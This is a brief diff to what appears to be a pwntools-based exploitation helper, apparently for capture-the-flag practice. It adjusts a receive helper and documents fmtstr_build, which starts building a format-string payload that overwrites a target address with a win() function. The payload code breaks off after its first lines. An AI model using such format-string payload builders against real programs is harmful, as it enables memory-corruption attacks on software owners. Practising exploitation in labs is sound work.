@@ -26,14 +26,17 @@ def start(prog, args, port=None, gdb_cmd=None):
 
     return p, elf
 
-def grab(p, start, end):
+def grab(p, start, end, drop=False):
     p.recvuntil(start)
-    return p.recvuntil(end, drop=True)
+    return p.recvuntil(end, drop)
 
 def pack(msg):
     print(bytes(msg, 'utf-8'))
     return bytes(msg, 'utf-8')
 
+# overwrites the address at target() with win().
+# offset specifies which stack variable you control %{target}$n 
+# padding specifies required padding to align the input in the stack variable (one of [0,1,2,3])
 def fmtstr_build(win, target, offset, padding):
     payload = b"A" * padding
     payload += p32(target + 0) + p32(target + 1) + p32(target + 2) + p32(target + 3)
